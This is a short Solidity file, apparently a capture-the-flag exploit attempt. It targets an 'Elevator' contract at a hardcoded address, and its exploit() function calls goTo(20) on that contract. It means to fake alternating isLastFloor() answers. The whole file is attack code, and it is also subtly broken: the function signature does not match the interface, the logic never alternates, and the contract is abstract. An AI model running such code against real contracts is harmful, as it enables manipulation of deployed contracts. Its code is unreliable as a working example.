pragma solidity ^0.8.9;

interface IBuilding {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
  function goTo(uint) external;
}


abstract contract Building {

  address targetAddress = 0xF012E9fbb8147dbFC9a7e0a337180F2B09a07F58;
  IElevator targetContract;
  constructor() {
    targetContract = IElevator(targetAddress);
  }

  function isLastFloor() view public returns (bool result) {
    if (result == true) {
      result = false;
    } else {
      result = true;
    }
    return result;
  }

  function exploit() public {
    targetContract.goTo(20);
  }
}
